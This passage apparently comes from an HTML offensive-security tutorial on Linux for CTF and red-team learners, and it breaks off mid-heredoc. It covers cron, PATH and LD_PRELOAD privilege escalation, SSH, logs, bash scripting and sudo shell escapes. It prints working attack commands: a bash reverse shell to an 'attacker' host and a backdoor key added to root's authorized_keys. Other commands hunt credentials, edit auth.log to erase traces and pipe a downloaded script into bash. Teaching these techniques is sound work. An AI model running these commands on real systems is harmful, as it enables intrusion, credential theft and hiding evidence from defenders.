+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">* * * * *  command
+│ │ │ │ └── day of week (0=Sun … 6=Sat)
+│ │ │ └──── month (1–12)
+│ │ └────── day of month (1–31)
+│ └──────── hour (0–23)
+└────────── minute (0–59)</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Examples:<br>
+- <code>0 * * * *</code> — every hour on the hour<br>
+- <code>*/5 * * * *</code> — every 5 minutes<br>
+- <code>0 2 * * 0</code> — 2am every Sunday<br>
+- <code>@reboot</code> — on boot</p>
+<p><strong>Where cron jobs live:</strong></p></div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Location</th><th>Who uses it</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>`crontab -e` / `/var/spool/cron/crontabs/`</td><td>Per-user crontab</td>
+                </tr>
+              
+                <tr>
+                  <td>`/etc/crontab`</td><td>System-wide, specifies user in field 6</td>
+                </tr>
+              
+                <tr>
+                  <td>`/etc/cron.d/`</td><td>Drop-in cron files</td>
+                </tr>
+              
+                <tr>
+                  <td>`/etc/cron.hourly/`, `/etc/cron.daily/`</td><td>Scripts run by `run-parts`</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Classic privesc patterns:</strong><br>
+- Root's crontab runs a script that's world-writable → overwrite it<br>
+- Root's crontab calls a binary whose <em>directory</em> is writable → drop a malicious file with the same name<br>
+- Root's crontab uses a wildcard <code>*</code> with <code>tar</code>, <code>chown</code>, <code>chmod</code> → argument injection<br>
+- Script uses a PATH that includes <code>/tmp</code> before system paths → drop a malicious binary named the same</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">Cron enumeration and abuse</span>
+          </div>
+          <pre><code class="language-bash"># View your crontab
+crontab -l
+
+# System crontabs
+cat /etc/crontab
+ls -la /etc/cron.d/
+ls -la /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/
+cat /etc/cron.d/*
+
+# All user crontabs (root only)
+cat /var/spool/cron/crontabs/*
+
+# Watch for processes spawned by cron (reveals hidden cron jobs)
+watch -n 1 &#34;ps aux --sort=start_time | tail -20&#34;
+# Or use pspy — no root needed, monitors procfs
+curl -sLo /tmp/pspy https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
+chmod +x /tmp/pspy &amp;&amp; /tmp/pspy
+
+# Find scripts called by cron that are writable
+crontab -l 2&gt;/dev/null | grep -oE &#39;/[^ ]+&#39; | xargs ls -la 2&gt;/dev/null
+
+# Tar wildcard injection — if cron runs: tar -czf backup.tgz *
+# Create files that become arguments to tar:
+echo &#34;/bin/bash -i &gt;&amp; /dev/tcp/attacker/4444 0&gt;&amp;1&#34; &gt; shell.sh
+echo &#34;&#34; &gt; &#34;--checkpoint=1&#34;
+echo &#34;&#34; &gt; &#34;--checkpoint-action=exec=sh shell.sh&#34;
+
+# Edit a writable cron script
+echo &#39;chmod u+s /bin/bash&#39; &gt;&gt; /path/to/writable_cron_script.sh
+# Wait for cron to run, then:
+bash -p    # -p preserves SUID effective UID</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">08</span>
+            <span class="heading-text">Environment Variables &amp; PATH Hijacking</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Environment variables</strong> are key=value pairs inherited by processes from their parent. They affect behaviour at runtime.</p></div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Variable</th><th>Purpose</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>`PATH`</td><td>Directories searched for commands in order</td>
+                </tr>
+              
+                <tr>
+                  <td>`HOME`</td><td>Current user&#39;s home directory</td>
+                </tr>
+              
+                <tr>
+                  <td>`USER` / `LOGNAME`</td><td>Username</td>
+                </tr>
+              
+                <tr>
+                  <td>`SHELL`</td><td>Default shell</td>
+                </tr>
+              
+                <tr>
+                  <td>`TERM`</td><td>Terminal type</td>
+                </tr>
+              
+                <tr>
+                  <td>`LD_PRELOAD`</td><td>Shared library loaded before all others</td>
+                </tr>
+              
+                <tr>
+                  <td>`LD_LIBRARY_PATH`</td><td>Additional library search directories</td>
+                </tr>
+              
+                <tr>
+                  <td>`PYTHONPATH`</td><td>Extra directories for Python imports</td>
+                </tr>
+              
+                <tr>
+                  <td>`HISTFILE`</td><td>Where bash history is saved</td>
+                </tr>
+              
+                <tr>
+                  <td>`HISTFILESIZE` / `HISTSIZE`</td><td>History length limits</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">PATH Hijacking</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>If a SUID binary (or a sudo rule) calls a command by <em>name</em> without an absolute path, and you control a directory that appears earlier in PATH, you win:</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash"># Vulnerable binary calls: system(&#34;cat /etc/passwd&#34;) internally
+# Export a modified PATH with /tmp first
+export PATH=/tmp:$PATH
+# Drop a fake &#39;cat&#39; in /tmp
+echo &#39;/bin/bash -p&#39; &gt; /tmp/cat
+chmod +x /tmp/cat
+# Run the vulnerable binary
+./vuln_binary   # calls /tmp/cat instead of /bin/cat → root shell</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">LD_PRELOAD</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>If a sudo rule allows running a binary and <code>env_keep+=LD_PRELOAD</code> is set in sudoers, you can inject a shared library into a root process:</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">c</span>
+            
+          </div>
+          <pre><code class="language-c">// inject.c
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+void __attribute__((constructor)) pwn() {
+    setuid(0); setgid(0);
+    system(&#34;/bin/bash&#34;);
+}</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash">gcc -shared -fPIC -o /tmp/inject.so inject.c
+sudo LD_PRELOAD=/tmp/inject.so /usr/bin/allowed_binary</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">Environment variable enumeration</span>
+          </div>
+          <pre><code class="language-bash"># Print all environment variables
+env
+printenv
+set | head -40
+
+# Specific variables
+echo $PATH
+echo $HOME
+echo $SHELL
+echo $LD_PRELOAD
+
+# Bash history — credentials frequently appear here
+cat ~/.bash_history
+cat ~/.zsh_history
+cat /home/*/.bash_history 2&gt;/dev/null
+
+# Find env vars containing &#39;pass&#39; or &#39;key&#39;
+env | grep -i -E &#39;pass|key|secret|token|api&#39;
+
+# Check sudo rules for unsafe env settings
+sudo -l | grep -E &#39;env_keep|SETENV|LD_&#39;
+
+# Persistent environment (set for all sessions)
+cat ~/.bashrc
+cat ~/.profile
+cat ~/.bash_profile
+cat /etc/environment
+cat /etc/profile
+ls /etc/profile.d/
+
+# Temporarily add /tmp to PATH
+export PATH=/tmp:$PATH
+
+# Check which &#39;python&#39; gets found
+which python python3 pip
+type python3</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">09</span>
+            <span class="heading-text">Networking Commands</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>From an active session, these commands tell you where you are, what's listening, and what you can reach.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">Network enumeration from a Linux shell</span>
+          </div>
+          <pre><code class="language-bash"># Interface and address info
+ip addr show
+ip link show
+ifconfig -a              # older systems
+
+# Routing table
+ip route show
+route -n
+
+# DNS configuration
+cat /etc/resolv.conf
+cat /etc/hosts           # local overrides — may reveal internal hostnames
+
+# Active connections and listening ports
+ss -tlnp                 # TCP listening
+ss -tulnp                # TCP + UDP listening
+ss -anp                  # all connections with process names
+netstat -tlnp            # older alternative
+lsof -i                  # all network file descriptors
+lsof -i :22              # specific port
+
+# ARP cache
+ip neigh
+arp -n
+
+# Firewall rules (requires root)
+iptables -L -n -v
+iptables -t nat -L -n    # NAT rules
+nft list ruleset         # nftables (newer)
+
+# Port forwarding / tunneling from the box
+# SSH local port forward — reach internal service via pivot
+ssh -L 8080:10.10.10.5:80 user@pivot
+# SSH dynamic SOCKS proxy
+ssh -D 1080 user@pivot
+# Chisel — TCP tunnel over HTTP
+chisel server -p 8080 --reverse    # on attacker
+chisel client attacker:8080 R:3306:127.0.0.1:3306   # on target
+
+# DNS lookups
+nslookup internal.corp
+dig internal.corp
+dig -x 10.10.10.1        # reverse lookup
+
+# Check connectivity
+curl -v http://10.10.10.5
+wget -qO- http://10.10.10.5
+ping -c 3 10.10.10.1
+nc -zv 10.10.10.5 22     # port check</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">10</span>
+            <span class="heading-text">SSH — Secure Shell</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>SSH is your primary method of remote access on Linux. Understanding it deeply matters both for using it effectively and for attacking it.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Key-based Authentication</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">~/.ssh/id_rsa        private key (protect with chmod 600)
+~/.ssh/id_rsa.pub    public key (share freely)
+~/.ssh/authorized_keys   public keys allowed to log in as this user
+~/.ssh/known_hosts   previously seen server fingerprints
+~/.ssh/config        client config (aliases, port, identity file)</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>SSH config file</strong> (<code>~/.ssh/config</code>) makes complex connections simple:</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">Host pivot
+    HostName 10.10.10.5
+    User alice
+    IdentityFile ~/.ssh/id_rsa_pivot
+    Port 2222
+
+Host internal
+    HostName 10.20.0.50
+    User root
+    ProxyJump pivot    # route through pivot automatically</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Red Team SSH Techniques</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Agent forwarding</strong> (<code>ssh -A</code>) forwards your SSH agent through a pivot, allowing you to SSH from the pivot to other machines using your local keys — but it also lets the pivot host (if compromised) use your agent.</p>
+<p><strong>SSH authorized_keys persistence</strong> — if you get write access to <code>~/.ssh/authorized_keys</code> for any user, add your public key for persistent backdoor access.</p>
+<p><strong>Private key hunting</strong> — SSH private keys are frequently left in home directories, backups, container images, and Git repos.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">SSH usage and red team techniques</span>
+          </div>
+          <pre><code class="language-bash"># Basic connection
+ssh user@10.10.10.5
+ssh -p 2222 user@10.10.10.5
+ssh -i ~/.ssh/id_rsa user@10.10.10.5
+
+# Generate keypair
+ssh-keygen -t ed25519 -C &#34;attacker&#34; -f ~/.ssh/attack_key
+
+# Copy public key to target (authorized access)
+ssh-copy-id user@10.10.10.5
+# Manual: append to authorized_keys
+cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys
+chmod 700 ~/.ssh &amp;&amp; chmod 600 ~/.ssh/authorized_keys
+
+# Persistence — add attacker key to root&#39;s authorized_keys
+echo &#34;ssh-ed25519 AAAA...attacker-key&#34; &gt;&gt; /root/.ssh/authorized_keys
+
+# Port forwarding
+ssh -L 8080:127.0.0.1:8080 user@10.10.10.5    # local forward
+ssh -R 4444:127.0.0.1:4444 user@10.10.10.5    # remote forward
+ssh -D 1080 user@10.10.10.5                   # SOCKS proxy
+
+# Execute command without full shell
+ssh user@10.10.10.5 &#34;cat /etc/passwd&#34;
+ssh user@10.10.10.5 &#34;ps aux | grep root&#34;
+
+# Crack SSH private key passphrase
+ssh2john id_rsa &gt; id_rsa.hash
+john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+# Find SSH keys on a compromised host
+find / -name &#34;id_rsa&#34; -o -name &#34;id_ed25519&#34; -o -name &#34;*.pem&#34; 2&gt;/dev/null
+find / -name &#34;authorized_keys&#34; 2&gt;/dev/null
+cat /etc/ssh/sshd_config | grep -v &#34;^#&#34; | grep -v &#34;^$&#34;   # SSH server config</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">11</span>
+            <span class="heading-text">Log Files — Reading the Evidence</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Logs are where defenders find attackers — and where attackers find credentials. Know where they are, what they contain, and what to look for.</p></div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Log file</th><th>Contents</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>`/var/log/auth.log`</td><td>SSH logins, sudo usage, su, PAM events (Debian/Ubuntu)</td>
+                </tr>
+              
+                <tr>
+                  <td>`/var/log/secure`</td><td>Same, on RHEL/CentOS</td>
+                </tr>
+              
+                <tr>
+                  <td>`/var/log/syslog`</td><td>General system messages</td>
+                </tr>
+              
+                <tr>
+                  <td>`/var/log/messages`</td><td>General (RHEL)</td>
+                </tr>
+              
+                <tr>
+                  <td>`/var/log/kern.log`</td><td>Kernel messages</td>
+                </tr>
+              
+                <tr>
+                  <td>`/var/log/cron`</td><td>Cron job executions</td>
+                </tr>
+              
+                <tr>
+                  <td>`/var/log/apache2/access.log`</td><td>HTTP requests</td>
+                </tr>
+              
+                <tr>
+                  <td>`/var/log/apache2/error.log`</td><td>Apache errors</td>
+                </tr>
+              
+                <tr>
+                  <td>`/var/log/nginx/access.log`</td><td>Nginx requests</td>
+                </tr>
+              
+                <tr>
+                  <td>`/var/log/mysql/error.log`</td><td>MySQL errors</td>
+                </tr>
+              
+                <tr>
+                  <td>`/var/log/wtmp`</td><td>Binary — all logins/logouts (`last` reads it)</td>
+                </tr>
+              
+                <tr>
+                  <td>`/var/log/btmp`</td><td>Binary — failed login attempts (`lastb` reads it)</td>
+                </tr>
+              
+                <tr>
+                  <td>`/var/log/lastlog`</td><td>Binary — last login per user (`lastlog` reads it)</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Credentials frequently appear in logs</strong> — HTTP basic auth in URLs, MySQL errors with connection strings, application stack traces printing config values.</p>
+<p><strong>Log tampering</strong> — attackers clear or truncate logs to erase evidence. Defenders use remote log shipping (syslog-ng, rsyslog, Splunk, ELK) specifically to make this harder.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">Log analysis</span>
+          </div>
+          <pre><code class="language-bash"># Follow auth log live (watch for logins during an engagement)
+tail -f /var/log/auth.log
+
+# Failed SSH login attempts
+grep &#34;Failed password&#34; /var/log/auth.log
+grep &#34;Failed password&#34; /var/log/auth.log | awk &#39;{print $11}&#39; | sort | uniq -c | sort -rn
+
+# Successful SSH logins
+grep &#34;Accepted password\|Accepted publickey&#34; /var/log/auth.log
+
+# Who has used sudo recently
+grep &#34;sudo&#34; /var/log/auth.log
+grep &#34;COMMAND&#34; /var/log/auth.log
+
+# Web log — look for interesting requests
+cat /var/log/nginx/access.log | grep -E &#34;(union|select|exec|cmd|passwd|etc)&#34;
+cat /var/log/apache2/access.log | grep &#34; 200 &#34; | awk &#39;{print $7}&#39; | sort | uniq -c | sort -rn
+
+# Failed login attempts (binary log)
+last
+lastb
+lastlog
+
+# journald — all logs via systemd
+journalctl --since &#34;30 min ago&#34;
+journalctl -u ssh
+journalctl _UID=0      # all messages from root processes
+
+# Search logs for credentials (red team)
+grep -rHi &#34;password\|passwd\|secret\|api_key\|token&#34; /var/log/ 2&gt;/dev/null
+
+# Clear auth log (anti-forensics — noisy, often detected)
+echo &gt; /var/log/auth.log
+# Or more surgical — remove your own entries:
+grep -v &#34;your.ip.address&#34; /var/log/auth.log &gt; /tmp/.auth.log &amp;&amp; mv /tmp/.auth.log /var/log/auth.log</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">12</span>
+            <span class="heading-text">Package Management</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Package managers install, update, and remove software. Knowing the right tool for the distribution you're on matters.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">Package managers — Debian/Ubuntu (apt) and RHEL/CentOS (yum/dnf)</span>
+          </div>
+          <pre><code class="language-bash"># ── Debian / Ubuntu / Kali — APT ────────────────────────────────────────────
+# Update package index
+apt update
+
+# Upgrade all installed packages
+apt upgrade
+apt full-upgrade    # may remove packages to resolve conflicts
+
+# Install / remove
+apt install nmap
+apt remove nmap
+apt purge nmap      # remove + config files
+
+# Search
+apt search nmap
+apt-cache search wordlist
+
+# Package info
+apt show nmap
+dpkg -L nmap                  # files installed by package
+dpkg -S /usr/bin/nmap         # which package owns this file
+dpkg --get-selections         # all installed packages
+
+# ── RHEL / CentOS / Fedora — YUM / DNF ─────────────────────────────────────
+yum install nmap
+dnf install nmap
+yum update
+yum search nmap
+rpm -qa                       # list all installed packages
+rpm -qf /usr/bin/nmap         # which package owns this file
+rpm -ql nmap                  # files in package
+
+# ── Manual install from source ───────────────────────────────────────────────
+./configure
+make
+make install
+
+# ── Snap / Flatpak ───────────────────────────────────────────────────────────
+snap install code
+flatpak install flathub org.gimp.GIMP
+
+# Find what&#39;s installed — quick recon on a new box
+dpkg -l | grep -i &#34;web\|sql\|php\|python&#34;
+rpm -qa | grep -i &#34;apache\|nginx\|mysql&#34;</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">13</span>
+            <span class="heading-text">Bash Scripting Fundamentals</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Bash scripts automate repetitive tasks and glue tools together. Even basic scripting skills massively speed up enumeration, payload staging, and post-exploitation.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">Bash scripting — essential constructs</span>
+          </div>
+          <pre><code class="language-bash">#!/bin/bash
+# Shebang line — tells the OS which interpreter to use
+
+# Variables
+NAME=&#34;alice&#34;
+IP=&#34;10.10.10.5&#34;
+echo &#34;Targeting $NAME at $IP&#34;
+
+# Command substitution
+KERNEL=$(uname -r)
+echo &#34;Kernel: $KERNEL&#34;
+CURRENT_USER=$(whoami)
+
+# Conditionals
+if [ -f /etc/shadow ]; then
+    echo &#34;shadow readable!&#34;
+elif [ -r /etc/passwd ]; then
+    echo &#34;passwd readable&#34;
+else
+    echo &#34;nothing interesting&#34;
+fi
+
+# Test operators
+# -f file exists and is regular file
+# -d directory exists
+# -r readable    -w writable    -x executable
+# -z string is empty    -n string is not empty
+# == -eq    != -ne    -lt -gt -le -ge  (numeric)
+
+# Loops
+for PORT in 22 80 443 3389; do
+    nc -zv -w1 $IP $PORT 2&gt;/dev/null &amp;&amp; echo &#34;$PORT OPEN&#34;
+done
+
+# Loop over files
+for FILE in /home/*/.ssh/id_rsa; do
+    [ -f &#34;$FILE&#34; ] &amp;&amp; echo &#34;Found key: $FILE&#34;
+done
+
+# While loop
+COUNTER=0
+while [ $COUNTER -lt 5 ]; do
+    echo &#34;Attempt $COUNTER&#34;
+    ((COUNTER++))
+done
+
+# Read input / read file line by line
+while IFS= read -r line; do
+    echo &#34;Processing: $line&#34;
+done &lt; /etc/passwd
+
+# Functions
+check_port() {
+    local host=$1
+    local port=$2
+    nc -zv -w1 &#34;$host&#34; &#34;$port&#34; 2&gt;/dev/null &amp;&amp; echo &#34;$host:$port OPEN&#34; || echo &#34;$host:$port CLOSED&#34;
+}
+check_port 10.10.10.5 80
+check_port 10.10.10.5 443
+
+# Exit codes and error handling
+set -e           # exit on any error
+set -o pipefail  # exit if any pipe command fails
+trap &#39;echo &#34;Error at line $LINENO&#34;&#39; ERR
+
+# Arguments
+echo &#34;Script: $0&#34;
+echo &#34;First arg: $1&#34;
+echo &#34;All args: $@&#34;
+echo &#34;Arg count: $#&#34;
+
+# Useful one-liners for recon scripts
+# Subnet sweep
+for i in $(seq 1 254); do
+    ping -c1 -W1 192.168.1.$i &amp;&gt;/dev/null &amp;&amp; echo &#34;192.168.1.$i UP&#34; &amp;
+done; wait
+
+# Port scan a host
+for PORT in $(seq 1 1000); do
+    (echo &gt; /dev/tcp/10.10.10.5/$PORT) 2&gt;/dev/null &amp;&amp; echo &#34;$PORT open&#34;
+done</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">14</span>
+            <span class="heading-text">Sudo &amp; Privilege Escalation Vectors</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong><code>sudo</code></strong> allows running commands as another user (usually root) based on rules in <code>/etc/sudoers</code>. It's the most common legitimate path to privilege — and a frequent misconfiguration target.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Reading sudoers</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">root    ALL=(ALL:ALL) ALL
+alice   ALL=(ALL:ALL) NOPASSWD: /usr/bin/vim
+bob     ALL=(root) NOPASSWD: /usr/bin/python3 /opt/script.py
+%devs   ALL=(ALL) /usr/bin/systemctl restart nginx</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><ul>
+<li><code>alice</code> can run <code>vim</code> as root without a password — trivial shell escape</li>
+<li><code>bob</code> can run one specific Python script as root... but if that script is writable, or if Python can import user-controlled files, it escalates</li>
+<li><code>%devs</code> requires a password and can only restart nginx — harder to abuse</li>
+</ul></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">GTFOBins</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><a href="https://gtfobins.github.io">GTFOBins</a> catalogs shell escapes for binaries commonly found in SUID and sudo misconfigurations. If a binary is allowed via sudo, check it.</p>
+<p>A few examples:</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash"># sudo vim → shell escape
+sudo vim -c &#39;:!/bin/bash&#39;
+
+# sudo less → shell escape
+sudo less /etc/passwd
+# inside less: !bash
+
+# sudo find
+sudo find / -exec /bin/bash \;
+
+# sudo python3
+sudo python3 -c &#39;import os; os.system(&#34;/bin/bash&#34;)&#39;  
+
+# sudo awk
+sudo awk &#39;BEGIN {system(&#34;/bin/bash&#34;)}&#39;
+
+# sudo tar
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+
+# sudo nano → Ctrl+R then Ctrl+X then: reset; sh 1&gt;&amp;0 2&gt;&amp;0</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Other Privesc Categories</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Vector</th><th>What to look for</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>SUID binaries</td><td>`find / -perm -4000` → check on GTFOBins</td>
+                </tr>
+              
+                <tr>
+                  <td>Writable cron scripts</td><td>Script called by root&#39;s cron, but writable by you</td>
+                </tr>
+              
+                <tr>
+                  <td>Weak file permissions</td><td>`/etc/passwd` writable? Add a root user. `/etc/shadow` readable? Crack it.</td>
+                </tr>
+              
+                <tr>
+                  <td>PATH hijacking</td><td>SUID/sudo binary calls command without full path</td>
+                </tr>
+              
+                <tr>
+                  <td>LD_PRELOAD</td><td>`env_keep+=LD_PRELOAD` in sudoers</td>
+                </tr>
+              
+                <tr>
+                  <td>Writable service files</td><td>Modify ExecStart, restart service</td>
+                </tr>
+              
+                <tr>
+                  <td>Capabilities</td><td>`getcap -r /` → cap_setuid on python3, etc.</td>
+                </tr>
+              
+                <tr>
+                  <td>NFS no_root_squash</td><td>Mount NFS share, create SUID binary as local root</td>
+                </tr>
+              
+                <tr>
+                  <td>Docker / LXD group</td><td>Container escape → root on host</td>
+                </tr>
+              
+                <tr>
+                  <td>Kernel exploits</td><td>Last resort — dirty cow, overlayfs, etc.</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">Privilege escalation enumeration checklist</span>
+          </div>
+          <pre><code class="language-bash"># ── Automated tools (run these first on CTFs) ────────────────────────────────
+# LinPEAS — comprehensive automated check
+curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
+
+# LinEnum
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+bash LinEnum.sh
+
+# LSE (Linux Smart Enumeration)
+bash lse.sh -l 2
+
+# ── Manual checks ────────────────────────────────────────────────────────────
+# 1. Who am I and what can I do?
+id &amp;&amp; whoami
+sudo -l
+
+# 2. SUID / SGID binaries
+find / -perm -4000 -type f 2&gt;/dev/null
+find / -perm -2000 -type f 2&gt;/dev/null
+
+# 3. Capabilities
+getcap -r / 2&gt;/dev/null
+
+# 4. Writable config / service files
+find /etc /lib/systemd /usr/lib/systemd -writable 2&gt;/dev/null
+find / -writable -type f -not -path &#39;/proc/*&#39; -not -path &#39;/sys/*&#39; 2&gt;/dev/null
+
+# 5. Cron jobs
+crontab -l
+cat /etc/crontab
+ls -la /etc/cron.*
+
+# 6. Running processes and listening services
+ps aux | grep root
+ss -tlnp
+
+# 7. Interesting files
+cat ~/.bash_history
+find / -name &#34;*.conf&#34; | xargs grep -li password 2&gt;/dev/null
+find / -name &#34;.env&#34; 2&gt;/dev/null | xargs cat 2&gt;/dev/null
+find / -name &#34;wp-config.php&#34; 2&gt;/dev/null | xargs cat 2&gt;/dev/null
+
+# 8. NFS shares with no_root_squash
+cat /etc/exports
+showmount -e localhost
+
+# 9. Sensitive /etc files
+ls -la /etc/passwd /etc/shadow /etc/group /etc/sudoers 2&gt;/dev/null
+
+# 10. Docker group membership
+id | grep docker
+# If in docker group:
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">15</span>
+            <span class="heading-text">Useful One-Liners &amp; Shell Tricks</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">Shell tricks for speed</span>
+          </div>
+          <pre><code class="language-bash"># Spawn a TTY from a dumb shell (post-exploitation)
+python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
+python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
+script /dev/null -c bash
+
+# Full interactive TTY upgrade
+# After spawning pty:
+Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm-256color
+stty rows 50 cols 220
+
+# Pipes and redirects
+command &gt; file.txt      # redirect stdout to file (overwrite)
+command &gt;&gt; file.txt     # append
+command 2&gt;/dev/null     # suppress errors
+command 2&gt;&amp;1            # stderr to stdout
+command &amp;&gt;/dev/null     # suppress both
+command1 | command2     # pipe stdout of 1 into stdin of 2
+
+# Background jobs
+sleep 3600 &amp;
+disown -h %1            # detach from terminal
+nohup ./long_script.sh &amp;&gt; /tmp/out.log &amp;
+
+# Here-string / heredoc
+grep &#34;root&#34; &lt;&lt;&lt; &#34;$(cat /etc/passwd)&#34;
+cat &lt;&lt; &#39;EOF&#39; &gt; /tmp/script.sh
+#!/bin/bash
+echo &#34;hello from heredoc&#34;
